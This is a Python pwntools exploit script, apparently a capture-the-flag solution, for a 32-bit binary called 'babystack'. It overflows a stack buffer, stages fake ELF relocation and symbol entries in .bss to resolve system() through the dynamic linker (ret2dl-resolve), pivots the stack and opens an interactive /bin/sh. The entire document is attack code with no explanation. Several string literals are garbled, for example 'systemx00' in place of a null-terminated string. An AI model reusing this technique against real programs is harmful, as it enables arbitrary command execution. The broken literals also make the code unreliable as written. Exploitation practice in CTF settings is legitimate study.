from pwn import *

#context.log_level = 'debug'

elf = ELF('./babystack')

offset = 44
read_plt = elf.plt['read']
read_got = elf.got['read']

ppp_ret = 0x080484e9        #pop esi ; pop edi ; pop ebp ; ret
pop_ebp_ret = 0x080484eb    #pop ebp ; ret
leave_ret = 0x080483a8

stack_size = 0x400
bss_addr = 0x0804a020
base_stage = bss_addr + stack_size

p = process('./babystack')
# gdb.attach(p)

payload  = 'A' * offset
payload += p32(read_plt)
payload += p32(0x804843B)
payload += p32(0)
payload += p32(base_stage)
payload += p32(200)
p.send(payload)



cmd = '/bin/sh'
plt_0 = 0x080482f0
ret_plt = 0x080482b0

index_offset = (base_stage + 28) - ret_plt
dynsym = 0x080481cc
dynstr = 0x0804822c

fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(read_got) + p32(r_info)
st_name = (fake_sym_addr + 16) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload = 'AAAA'
payload += p32(plt_0)
payload += p32(index_offset)
payload += 'AAAA'
payload += p32(base_stage + 80)
payload += 'a' * 8
payload += fake_reloc
payload += align * "B"
payload += fake_sym
payload += "systemx00"
payload += "A" * (80 - len(payload))
payload += cmd + 'x00'
payload += "A"*(200 - len(payload))
p.send(payload)


payload  = 'A' * (offset)
payload += p32(pop_ebp_ret)
payload += p32(base_stage)
payload += p32(leave_ret)  #mov esp, ebp; pop ebp; ret
p.send(payload)

p.interactive()
